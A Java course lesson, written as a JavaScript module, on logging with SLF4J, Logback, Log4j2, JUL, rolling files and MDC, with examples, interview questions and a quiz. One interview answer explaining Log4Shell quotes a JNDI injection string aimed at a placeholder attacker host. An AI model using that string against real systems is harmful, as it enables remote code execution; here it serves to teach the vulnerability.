const julCode = `import java.util.logging.*;

public class Main {
    private static final Logger log = Logger.getLogger("com.stn.OrderService");

    public static void main(String[] args) {
        log.setUseParentHandlers(false);          // do not use the default console handler

        Handler handler = new Handler() {         // simple handler that prints to System.out
            @Override
            public void publish(LogRecord r) {
                if (isLoggable(r)) {
                    System.out.print(getFormatter().format(r));
                }
            }
            @Override public void flush() { }
            @Override public void close() { }
        };
        handler.setFormatter(new Formatter() {    // our own pattern: [LEVEL] logger - message
            @Override
            public String format(LogRecord r) {
                return "[" + r.getLevel() + "] " + r.getLoggerName() + " - " + formatMessage(r) + "\\n";
            }
        });
        log.addHandler(handler);
        log.setLevel(Level.INFO);

        log.severe("Payment gateway down");
        log.warning("Low stock for item P-101");
        log.info("Order placed");
        log.fine("Cart details: 3 items");        // below INFO -> ignored
        log.log(Level.INFO, "Order {0} placed by {1}", new Object[]{"ORD-7", "Riya"});

        System.out.println("Switching level to FINE");
        log.setLevel(Level.FINE);
        log.fine("Cart details: 3 items");
    }
}`;

const mdcCode = `import java.util.LinkedHashMap;
import java.util.Map;

// A tiny version of SLF4J's MDC (Mapped Diagnostic Context) using ThreadLocal
class MDC {
    private static final ThreadLocal<Map<String, String>> CTX =
            ThreadLocal.withInitial(LinkedHashMap::new);

    static void put(String key, String value) { CTX.get().put(key, value); }
    static String get(String key) { return CTX.get().get(key); }
    static void clear() { CTX.remove(); }
}

public class Main {
    static void log(String level, String msg) {
        System.out.println(String.format("%-5s [reqId=%s, user=%s] %s",
                level, MDC.get("reqId"), MDC.get("user"), msg));
    }

    static void handlePayment(String reqId, String user, int amount) {
        MDC.put("reqId", reqId);
        MDC.put("user", user);
        try {
            log("INFO", "Payment started");
            if (amount > 10000) {
                log("WARN", "High amount: " + amount);
            }
            log("INFO", "Payment done");
        } finally {
            MDC.clear();                 // ALWAYS clear (threads are reused in servers)
        }
    }

    public static void main(String[] args) {
        handlePayment("R1", "riya", 500);
        handlePayment("R2", "aman", 25000);
        log("INFO", "After requests");
    }
}`;

export default {
  id: 'day-05-logging-slf4j-logback-log4j2',
  title: 'Logging in Java: SLF4J, Logback, Log4j2, Levels, Rolling Files and MDC',
  module: 'Module 1: Build Tools, Git & Libraries',
  day: 5,
  level: 'Intermediate',
  duration: '2.5 hours',
  summary: 'Replace System.out.println with professional logging: the SLF4J facade, Logback and Log4j2 implementations, log levels, logback.xml / log4j2.xml configuration, rolling file appenders, MDC for request tracing, java.util.logging and logging best practices.',
  objectives: [
    'Explain why logging is better than System.out.println and the facade vs implementation idea',
    'Use log levels correctly (TRACE, DEBUG, INFO, WARN, ERROR) with parameterized messages',
    'Configure Logback and Log4j2 with console and rolling file appenders',
    'Use MDC to add request id / user to every log line',
    'Configure logging in Spring Boot and follow logging best practices',
  ],
  theory: [
    {
      heading: '1. Why Logging? (Not System.out.println)',
      content: 'In production nobody watches the console. When a customer says "my payment failed at 10:15", you open the log FILE and search. println has no time, no level, no class name, cannot be turned off, and cannot be sent to files or tools. A logging framework gives timestamp, level, thread, class, and lets you change the amount of detail through configuration without changing code. Analogy: println is shouting in a room; logging is a CCTV recorder with time stamps that you can rewind and filter.',
      points: [
        'Levels: show only important messages in production, more detail in development',
        'Destinations (appenders): console, file, rolling file, database, ELK/Splunk/CloudWatch',
        'Format (pattern/layout): time, level, thread, logger, message, JSON',
        'Performance: disabled levels cost almost nothing; async appenders',
      ],
    },
    {
      heading: '2. SLF4J Facade and Implementations',
      content: 'SLF4J (Simple Logging Facade for Java) is an INTERFACE (API). Your code only talks to SLF4J. The actual work is done by an implementation (binding) chosen at deployment: Logback (default in Spring Boot, written by the same author as SLF4J) or Log4j2 (Apache, very fast, async loggers). java.util.logging (JUL) is built into the JDK and needs no library. Analogy: SLF4J is a universal charger socket; Logback and Log4j2 are different brands of power supply. Change the brand, your phone (code) does not change.',
      syntax: `import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class OrderService {
    private static final Logger log = LoggerFactory.getLogger(OrderService.class);

    public void place(String id, double amount) {
        log.info("Placing order {} for amount {}", id, amount);   // {} placeholders
    }
}`,
      points: [
        'slf4j-api + logback-classic (Logback) OR slf4j-api + log4j-slf4j2-impl (Log4j2)',
        'Have exactly ONE binding on the classpath; multiple bindings give a warning and an unpredictable choice',
        'Bridges route other APIs into SLF4J: jcl-over-slf4j (commons-logging), jul-to-slf4j, log4j-over-slf4j',
        'Lombok @Slf4j creates the log field for you',
      ],
    },
    {
      heading: '3. Log Levels',
      content: 'Levels from most detailed to most serious: TRACE < DEBUG < INFO < WARN < ERROR (Log4j2 also has FATAL; JUL uses FINEST < FINER < FINE < CONFIG < INFO < WARNING < SEVERE). If a logger is set to INFO, it prints INFO, WARN and ERROR and ignores DEBUG and TRACE. Child loggers inherit the level from the parent (com.stn.service inherits from com.stn, which inherits from root).',
      points: [
        'TRACE – very fine details (loop values, method entry/exit)',
        'DEBUG – information useful for developers (SQL params, computed values)',
        'INFO – important business events (Order placed, User registered, App started)',
        'WARN – something unexpected but the app continues (retrying, low stock, deprecated API)',
        'ERROR – an operation failed, needs attention; always log the exception object',
        'Typical: production root = INFO (or WARN), your package = INFO, during debugging set it to DEBUG',
      ],
      syntax: `log.debug("Cart {} has {} items", cartId, items.size());
log.error("Payment failed for order {}", orderId, ex);   // last arg exception -> stack trace printed`,
    },
    {
      heading: '4. Logback Configuration (logback.xml) and Rolling Files',
      content: 'Logback reads logback.xml (or logback-spring.xml in Spring Boot) from src/main/resources. Three building blocks: appender (WHERE to write), encoder/pattern (HOW it looks), logger (WHICH package at WHAT level). A RollingFileAppender starts a new file when a time or size limit is reached and deletes old files, so the disk never fills. Diagram: app.log (today) → app-2026-11-17.0.log.gz → ... (kept for 30 days, max 1GB total).',
      syntax: `<configuration>
  <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
    <encoder><pattern>%d{HH:mm:ss.SSS} %-5level [%thread] %logger{36} - %msg%n</pattern></encoder>
  </appender>
  <logger name="com.stn" level="DEBUG"/>
  <root level="INFO"><appender-ref ref="CONSOLE"/></root>
</configuration>`,
      points: [
        '%d date, %-5level level padded to 5, %thread, %logger{36} shortened class name, %msg, %n newline, %X{key} MDC value',
        'SizeAndTimeBasedRollingPolicy: fileNamePattern with %d and %i, maxFileSize, maxHistory, totalSizeCap',
        'additivity="false" stops a logger from also writing to the root appenders (avoids duplicate lines)',
        'AsyncAppender wraps another appender so logging does not slow requests',
      ],
    },
    {
      heading: '5. Log4j2 Configuration (log4j2.xml)',
      content: 'Log4j2 uses log4j2.xml in src/main/resources with <Appenders> and <Loggers>. It supports RollingFile with policies (TimeBasedTriggeringPolicy, SizeBasedTriggeringPolicy) and a DefaultRolloverStrategy. Its async loggers (with the LMAX Disruptor) are very fast. Security note: Log4Shell (CVE-2021-44228, Dec 2021) affected Log4j2 2.0–2.14.1 through JNDI lookups; always use 2.17.1 or newer. Log4j 1.x is end-of-life; do not use it.',
      tip: 'In Spring Boot, switching to Log4j2 = exclude spring-boot-starter-logging and add spring-boot-starter-log4j2.',
    },
    {
      heading: '6. MDC (Mapped Diagnostic Context)',
      content: 'On a server, 100 requests run at the same time and their log lines get mixed. MDC is a per-thread map (ThreadLocal) of key-values like requestId and userId. You put them at the start of a request (usually in a Servlet Filter or interceptor), every log line prints them via %X{requestId}, and you clear them at the end. Then grep requestId=abc123 shows the full story of one request. In microservices the same idea becomes trace ids (Micrometer Tracing / Zipkin).',
      syntax: `MDC.put("requestId", UUID.randomUUID().toString());
try {
    chain.doFilter(request, response);
} finally {
    MDC.clear();     // thread pools reuse threads!
}
// pattern: %d %-5level [%X{requestId}] %logger{36} - %msg%n`,
    },
    {
      heading: '7. Logging Best Practices',
      content: 'Good logs save hours of debugging; bad logs fill disks and leak data.',
      points: [
        'Use parameterized messages log.debug("User {}", id) instead of string concatenation (no cost when DEBUG is off)',
        'Logger per class: private static final Logger log = LoggerFactory.getLogger(MyClass.class)',
        'Log the exception object: log.error("msg", e) – never only e.getMessage(), never e.printStackTrace()',
        'Do not log and rethrow the same exception at every layer (duplicate stack traces)',
        'NEVER log passwords, OTPs, card numbers, Aadhaar/PAN, JWT tokens; mask them',
        'Correct level: not everything is ERROR; do not log inside tight loops at INFO',
        'Use rolling files with maxHistory/totalSizeCap; structured JSON logs for ELK/Loki',
        'Change levels via configuration/Actuator, not by editing code',
      ],
    },
  ],
  examples: [
    {
      title: 'java.util.logging (JUL) with Levels and a Custom Formatter (runnable)',
      scenario: 'Use the JDK\'s built-in logger (no library) with our own format and see how levels filter messages.',
      steps: [
        'IntelliJ: File > New > Java Class > Main (no dependencies needed)',
        'Type the code and click Run ▶',
        'Change log.setLevel(Level.INFO) to Level.WARNING and run again to see fewer lines',
      ],
      code: julCode,
      java: { files: { 'Main.java': julCode } },
      result: `[SEVERE] com.stn.OrderService - Payment gateway down
[WARNING] com.stn.OrderService - Low stock for item P-101
[INFO] com.stn.OrderService - Order placed
[INFO] com.stn.OrderService - Order ORD-7 placed by Riya
Switching level to FINE
[FINE] com.stn.OrderService - Cart details: 3 items`,
      explanation: 'With level INFO, the first fine() call is dropped. formatMessage() replaces {0} and {1} with the parameters. After setLevel(Level.FINE) the same fine() message is printed. setUseParentHandlers(false) stops the root ConsoleHandler from printing a second (stderr, date-stamped) copy. Without our handler, JUL prints two lines per message: a date + class/method line and "INFO: Order placed".',
    },
    {
      title: 'MDC Idea with ThreadLocal (runnable simulation)',
      scenario: 'Attach a request id and user to every log line automatically, like SLF4J MDC does.',
      steps: [
        'Create Main.java with both classes',
        'Click Run ▶',
        'Notice the last line after clear() shows null values',
      ],
      code: mdcCode,
      java: { files: { 'Main.java': mdcCode } },
      result: `INFO  [reqId=R1, user=riya] Payment started
INFO  [reqId=R1, user=riya] Payment done
INFO  [reqId=R2, user=aman] Payment started
WARN  [reqId=R2, user=aman] High amount: 25000
INFO  [reqId=R2, user=aman] Payment done
INFO  [reqId=null, user=null] After requests`,
      explanation: 'The log() method never receives reqId or user as parameters: it reads them from the thread-local context, exactly like %X{reqId} in a Logback pattern. %-5s pads INFO/WARN to 5 characters so columns line up. Clearing in finally is essential because server threads are reused for the next request.',
    },
    {
      title: 'SLF4J + Logback in a Maven Project with Rolling File Appender',
      scenario: 'A plain Java app writes INFO to console and DEBUG to a daily rolling file that keeps 30 days.',
      steps: [
        'Add slf4j-api and logback-classic to pom.xml and reload',
        'Create src/main/resources/logback.xml',
        'Create OrderService.java and App.java, run App ▶',
        'Check the logs/ folder in the project root (refresh in IntelliJ / F5 in Eclipse)',
      ],
      code: `<!-- pom.xml -->
<dependency>
  <groupId>org.slf4j</groupId>
  <artifactId>slf4j-api</artifactId>
  <version>2.0.13</version>
</dependency>
<dependency>
  <groupId>ch.qos.logback</groupId>
  <artifactId>logback-classic</artifactId>
  <version>1.5.6</version>
</dependency>

<!-- src/main/resources/logback.xml -->
<configuration>
  <property name="LOG_DIR" value="logs"/>

  <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
    <filter class="ch.qos.logback.classic.filter.ThresholdFilter">
      <level>INFO</level>
    </filter>
    <encoder>
      <pattern>%d{HH:mm:ss.SSS} %-5level [%thread] %logger{20} - %msg%n</pattern>
    </encoder>
  </appender>

  <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
    <file>\${LOG_DIR}/app.log</file>
    <rollingPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy">
      <fileNamePattern>\${LOG_DIR}/app-%d{yyyy-MM-dd}.%i.log.gz</fileNamePattern>
      <maxFileSize>10MB</maxFileSize>
      <maxHistory>30</maxHistory>
      <totalSizeCap>1GB</totalSizeCap>
    </rollingPolicy>
    <encoder>
      <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %-5level [%thread] %logger{36} - %msg%n</pattern>
    </encoder>
  </appender>

  <logger name="com.stn" level="DEBUG"/>

  <root level="INFO">
    <appender-ref ref="CONSOLE"/>
    <appender-ref ref="FILE"/>
  </root>
</configuration>

// OrderService.java
package com.stn;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class OrderService {
    private static final Logger log = LoggerFactory.getLogger(OrderService.class);

    public void placeOrder(String orderId, double amount) {
        log.debug("Validating order {} amount {}", orderId, amount);
        if (amount <= 0) {
            log.warn("Invalid amount {} for order {}", amount, orderId);
            return;
        }
        try {
            if (amount > 50000) throw new IllegalStateException("Limit exceeded");
            log.info("Order {} placed successfully", orderId);
        } catch (IllegalStateException e) {
            log.error("Order {} failed", orderId, e);
        }
    }
}

// App.java
package com.stn;

public class App {
    public static void main(String[] args) {
        OrderService s = new OrderService();
        s.placeOrder("ORD-1", 1200);
        s.placeOrder("ORD-2", -5);
        s.placeOrder("ORD-3", 75000);
    }
}`,
      result: `Console:
10:15:02.114 INFO  [main] com.stn.OrderService - Order ORD-1 placed successfully
10:15:02.116 WARN  [main] com.stn.OrderService - Invalid amount -5.0 for order ORD-2
10:15:02.117 ERROR [main] com.stn.OrderService - Order ORD-3 failed
java.lang.IllegalStateException: Limit exceeded
	at com.stn.OrderService.placeOrder(OrderService.java:16)
	at com.stn.App.main(App.java:8)

logs/app.log (also has DEBUG lines):
2026-11-18 10:15:02.110 DEBUG [main] com.stn.OrderService - Validating order ORD-1 amount 1200.0
2026-11-18 10:15:02.114 INFO  [main] com.stn.OrderService - Order ORD-1 placed successfully
2026-11-18 10:15:02.115 DEBUG [main] com.stn.OrderService - Validating order ORD-2 amount -5.0
...`,
      explanation: 'The com.stn logger allows DEBUG; the console ThresholdFilter only lets INFO+ through, while the file receives everything. Passing e as the last argument (with no {} for it) prints the full stack trace. Each day (or each 10MB) a new compressed file is created; files older than 30 days are deleted.',
    },
    {
      title: 'Log4j2 Configuration with RollingFile',
      scenario: 'Your company standard is Log4j2. Configure console + rolling file and keep SLF4J in code.',
      steps: [
        'Add log4j-slf4j2-impl (it brings log4j-api and log4j-core) and remove logback-classic',
        'Create src/main/resources/log4j2.xml',
        'Run the same App as before; the code does not change because it uses SLF4J',
      ],
      code: `<!-- pom.xml -->
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-slf4j2-impl</artifactId>
  <version>2.23.1</version>
</dependency>

<!-- src/main/resources/log4j2.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
  <Properties>
    <Property name="PATTERN">%d{yyyy-MM-dd HH:mm:ss.SSS} %-5level [%t] %c{1.} - %msg%n</Property>
  </Properties>

  <Appenders>
    <Console name="Console" target="SYSTEM_OUT">
      <PatternLayout pattern="\${PATTERN}"/>
    </Console>

    <RollingFile name="RollingFile" fileName="logs/app.log"
                 filePattern="logs/app-%d{yyyy-MM-dd}-%i.log.gz">
      <PatternLayout pattern="\${PATTERN}"/>
      <Policies>
        <TimeBasedTriggeringPolicy/>
        <SizeBasedTriggeringPolicy size="10 MB"/>
      </Policies>
      <DefaultRolloverStrategy max="20"/>
    </RollingFile>
  </Appenders>

  <Loggers>
    <Logger name="com.stn" level="debug" additivity="false">
      <AppenderRef ref="Console"/>
      <AppenderRef ref="RollingFile"/>
    </Logger>
    <Root level="info">
      <AppenderRef ref="Console"/>
    </Root>
  </Loggers>
</Configuration>`,
      result: `2026-11-18 10:20:41.502 DEBUG [main] c.s.OrderService - Validating order ORD-1 amount 1200.0
2026-11-18 10:20:41.505 INFO  [main] c.s.OrderService - Order ORD-1 placed successfully
2026-11-18 10:20:41.505 DEBUG [main] c.s.OrderService - Validating order ORD-2 amount -5.0
2026-11-18 10:20:41.506 WARN  [main] c.s.OrderService - Invalid amount -5.0 for order ORD-2
...`,
      explanation: 'Only the binding and config file changed; the SLF4J code stayed the same (that is the power of a facade). %c{1.} shortens package names to first letters. additivity="false" prevents com.stn lines from being printed twice (once by its own Console ref and once by Root). Files roll daily or at 10MB, keeping up to 20 per day.',
    },
    {
      title: 'Logging in Spring Boot: application.properties, logback-spring.xml and an MDC Filter',
      scenario: 'Configure levels and file logging in Spring Boot and add a request id to every line.',
      steps: [
        'Spring Boot already includes SLF4J + Logback (spring-boot-starter-logging) – no dependency needed',
        'Add the properties below to src/main/resources/application.properties',
        'Create RequestIdFilter.java in your project',
        'Run the app, call any endpoint in Postman, look at the console and logs/app.log',
        'Change a level at runtime: POST /actuator/loggers/com.stn with body {"configuredLevel":"DEBUG"} (Actuator enabled)',
      ],
      code: `# application.properties
logging.level.root=INFO
logging.level.com.stn=DEBUG
logging.level.org.hibernate.SQL=DEBUG
logging.file.name=logs/app.log
logging.logback.rollingpolicy.max-file-size=10MB
logging.logback.rollingpolicy.max-history=30
logging.pattern.console=%d{HH:mm:ss} %-5level [%X{requestId}] %logger{25} - %msg%n

// RequestIdFilter.java
package com.stn.config;

import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.MDC;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;
import java.io.IOException;
import java.util.UUID;

@Component
public class RequestIdFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain)
            throws ServletException, IOException {
        String id = UUID.randomUUID().toString().substring(0, 8);
        MDC.put("requestId", id);
        res.setHeader("X-Request-Id", id);
        try {
            chain.doFilter(req, res);
        } finally {
            MDC.clear();
        }
    }
}`,
      result: `10:31:07 INFO  [3f9c1a2b] c.s.controller.OrderController - GET /orders/7
10:31:07 DEBUG [3f9c1a2b] org.hibernate.SQL - select o1_0.id,o1_0.amount from orders o1_0 where o1_0.id=?
10:31:07 INFO  [3f9c1a2b] c.s.service.OrderService - Order 7 found
10:31:08 INFO  [a71d0e44] c.s.controller.OrderController - GET /orders/9
10:31:08 WARN  [a71d0e44] c.s.service.OrderService - Order 9 not found`,
      explanation: 'Spring Boot maps logging.* properties to Logback, so for simple needs you do not even need logback.xml (use logback-spring.xml for advanced config with <springProfile>). The filter puts a short request id in MDC; %X{requestId} prints it, so you can trace one request and give the id from the X-Request-Id header to support teams.',
    },
  ],
  interview: [
    { q: 'Why use a logging framework instead of System.out.println?', a: 'Logging frameworks provide levels, timestamps, thread and class info, multiple destinations (console, rolling files, remote), configurable formats, filtering by package, async performance, and can be changed without code changes. println cannot be controlled or turned off and only goes to stdout.', level: 'Easy' },
    { q: 'What is SLF4J?', a: 'Simple Logging Facade for Java: an API/abstraction for logging. Code depends only on SLF4J; the actual implementation (Logback, Log4j2, JUL) is chosen by the binding on the classpath, so you can switch implementations without changing code.', level: 'Easy' },
    { q: 'Order of log levels and what does setting INFO mean?', a: 'TRACE < DEBUG < INFO < WARN < ERROR. Setting INFO prints INFO, WARN and ERROR, and suppresses DEBUG and TRACE.', level: 'Easy' },
    { q: 'Why use {} placeholders instead of string concatenation?', a: 'With log.debug("User " + user) the string is built even if DEBUG is disabled. With log.debug("User {}", user) formatting happens only if the level is enabled, saving CPU and garbage. It is also more readable.', level: 'Medium' },
    { q: 'Which logging framework does Spring Boot use by default and how do you switch to Log4j2?', a: 'SLF4J with Logback via spring-boot-starter-logging. To switch, exclude spring-boot-starter-logging from spring-boot-starter (web) and add spring-boot-starter-log4j2, then provide log4j2-spring.xml if needed.', level: 'Medium' },
    { q: 'What is a rolling file appender?', a: 'An appender that writes to a file and "rolls over" to a new file based on time (daily) and/or size (10MB), optionally compressing old files and deleting files beyond maxHistory/totalSizeCap, so log files do not grow forever.', level: 'Medium' },
    { q: 'What is MDC and where do you use it?', a: 'Mapped Diagnostic Context: a thread-local map of key-values (requestId, userId) automatically added to log lines via %X{key}. Set it in a filter/interceptor at request start and clear it in finally. Used to trace a single request among concurrent ones.', level: 'Hard' },
    { q: 'What is logger additivity?', a: 'By default a log event is sent to the logger\'s appenders and also to all parent loggers\' appenders (up to root). additivity="false" stops that propagation, typically to avoid duplicate lines.', level: 'Hard' },
    { q: 'What was Log4Shell?', a: 'CVE-2021-44228, a critical remote code execution vulnerability in Log4j2 2.0–2.14.1: logging a string like ${jndi:ldap://attacker/x} triggered a JNDI lookup that could load attacker code. Fixed by upgrading (2.17.1+). It shows why logging user input and keeping libraries updated matters.', level: 'Hard' },
    { q: 'How do you log an exception properly?', a: 'log.error("Failed to process order {}", orderId, ex); passing the exception as the last argument prints the full stack trace. Avoid e.printStackTrace() and logging only e.getMessage(); avoid logging the same exception at every layer.', level: 'Medium' },
    { q: 'What should never be logged?', a: 'Passwords, OTPs, tokens (JWT, API keys), full card numbers/CVV, Aadhaar/PAN and other personal data. Mask or omit them; this is also required by security/compliance rules.', level: 'Easy' },
    { q: 'What is java.util.logging?', a: 'The JDK\'s built-in logging API (java.util.logging.Logger) with levels SEVERE, WARNING, INFO, CONFIG, FINE, FINER, FINEST, Handlers (ConsoleHandler, FileHandler) and Formatters. It needs no library but is less flexible; jul-to-slf4j can route it into SLF4J.', level: 'Medium' },
  ],
  practice: [
    {
      task: 'Write a JUL program (no libraries) that logs to System.out in the format "LEVEL: message", sets level WARNING, and logs one SEVERE, one WARNING and one INFO message. Write the expected output.',
      hint: 'Custom Handler + Formatter, setUseParentHandlers(false).',
      solution: `import java.util.logging.*;

public class Main {
    private static final Logger log = Logger.getLogger("demo");

    public static void main(String[] args) {
        log.setUseParentHandlers(false);
        Handler h = new Handler() {
            @Override public void publish(LogRecord r) {
                if (isLoggable(r)) System.out.print(getFormatter().format(r));
            }
            @Override public void flush() { }
            @Override public void close() { }
        };
        h.setFormatter(new Formatter() {
            @Override public String format(LogRecord r) {
                return r.getLevel() + ": " + formatMessage(r) + "\\n";
            }
        });
        log.addHandler(h);
        log.setLevel(Level.WARNING);

        log.severe("Database not reachable");
        log.warning("Retrying in 5 seconds");
        log.info("Application started");
    }
}
/* Output:
SEVERE: Database not reachable
WARNING: Retrying in 5 seconds
*/`,
    },
    {
      task: 'Write a logback.xml that writes everything WARN and above into logs/error.log (rolling daily, keep 15 days) and INFO and above to the console, with com.stn at DEBUG for the console.',
      hint: 'ThresholdFilter on the error file appender; TimeBasedRollingPolicy.',
      solution: `<configuration>
  <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
    <encoder>
      <pattern>%d{HH:mm:ss} %-5level %logger{30} - %msg%n</pattern>
    </encoder>
  </appender>

  <appender name="ERROR_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
    <filter class="ch.qos.logback.classic.filter.ThresholdFilter">
      <level>WARN</level>
    </filter>
    <file>logs/error.log</file>
    <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
      <fileNamePattern>logs/error-%d{yyyy-MM-dd}.log</fileNamePattern>
      <maxHistory>15</maxHistory>
    </rollingPolicy>
    <encoder>
      <pattern>%d{yyyy-MM-dd HH:mm:ss} %-5level [%thread] %logger - %msg%n</pattern>
    </encoder>
  </appender>

  <logger name="com.stn" level="DEBUG"/>

  <root level="INFO">
    <appender-ref ref="CONSOLE"/>
    <appender-ref ref="ERROR_FILE"/>
  </root>
</configuration>`,
    },
    {
      task: 'Rewrite this bad logging code using best practices: System.out.println("User " + user.getName() + " login failed " + e.getMessage() + " password=" + password); e.printStackTrace();',
      hint: 'SLF4J logger, placeholders, exception as last argument, no password.',
      solution: `import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class LoginService {
    private static final Logger log = LoggerFactory.getLogger(LoginService.class);

    public void login(User user, String password) {
        try {
            authenticate(user, password);
            log.info("User {} logged in", user.getName());
        } catch (AuthenticationException e) {
            // no password in logs; full stack trace via last argument
            log.warn("Login failed for user {}", user.getName(), e);
        }
    }

    private void authenticate(User user, String password) throws AuthenticationException {
        // ...
    }
}`,
    },
    {
      task: 'Configure a Spring Boot app to use Log4j2 instead of Logback. Show the pom.xml changes.',
      hint: 'Exclusion of spring-boot-starter-logging.',
      solution: `<dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-web</artifactId>
  <exclusions>
    <exclusion>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-logging</artifactId>
    </exclusion>
  </exclusions>
</dependency>
<dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-log4j2</artifactId>
</dependency>

<!-- then add src/main/resources/log4j2-spring.xml (optional) -->
<!-- application.properties logging.level.* and logging.file.name still work -->`,
    },
    {
      task: 'Extend the MDC simulation: add a "txnId" key, print it in every line, and process 3 payments (R1/riya/100, R2/aman/20000, R3/neha/700) with txnIds T100, T200, T300. Write the expected output.',
      hint: 'Add MDC.put("txnId", ...) and include it in String.format.',
      solution: `import java.util.LinkedHashMap;
import java.util.Map;

class MDC {
    private static final ThreadLocal<Map<String, String>> CTX = ThreadLocal.withInitial(LinkedHashMap::new);
    static void put(String k, String v) { CTX.get().put(k, v); }
    static String get(String k) { return CTX.get().get(k); }
    static void clear() { CTX.remove(); }
}

public class Main {
    static void log(String level, String msg) {
        System.out.println(String.format("%-5s [reqId=%s, txn=%s, user=%s] %s",
                level, MDC.get("reqId"), MDC.get("txnId"), MDC.get("user"), msg));
    }

    static void pay(String req, String user, String txn, int amount) {
        MDC.put("reqId", req);
        MDC.put("txnId", txn);
        MDC.put("user", user);
        try {
            if (amount > 10000) log("WARN", "High amount " + amount);
            else log("INFO", "Paid " + amount);
        } finally {
            MDC.clear();
        }
    }

    public static void main(String[] args) {
        pay("R1", "riya", "T100", 100);
        pay("R2", "aman", "T200", 20000);
        pay("R3", "neha", "T300", 700);
    }
}
/* Output:
INFO  [reqId=R1, txn=T100, user=riya] Paid 100
WARN  [reqId=R2, txn=T200, user=aman] High amount 20000
INFO  [reqId=R3, txn=T300, user=neha] Paid 700
*/`,
    },
  ],
  quiz: [
    { question: 'If the logger level is WARN, which call is printed?', options: ['log.info("a")', 'log.debug("b")', 'log.error("c")', 'log.trace("d")'], answer: 2, explanation: 'WARN prints WARN and ERROR only.' },
    { question: 'Which is the default logging implementation in Spring Boot?', options: ['Logback', 'Log4j 1.x', 'java.util.logging', 'Commons Logging'], answer: 0, explanation: 'spring-boot-starter-logging = SLF4J + Logback.' },
    { question: 'What does %X{requestId} print in a Logback pattern?', options: ['The thread name', 'A random UUID', 'The HTTP header', 'The MDC value for requestId'], answer: 3, explanation: '%X reads from the Mapped Diagnostic Context.' },
    { question: 'Best way to log an exception with SLF4J?', options: ['e.printStackTrace()', 'log.error("Failed for order {}", id, e)', 'log.error(e.getMessage())', 'System.err.println(e)'], answer: 1, explanation: 'Passing the exception as the last argument logs the full stack trace through the framework.' },
    { question: 'What does a rolling file appender with maxHistory=30 do?', options: ['Keeps only 30 lines', 'Logs 30 times per second', 'Keeps rolled log files for 30 periods (e.g. days) and deletes older ones', 'Creates 30 files at startup'], answer: 2, explanation: 'Old archives beyond maxHistory are deleted.' },
  ],
};
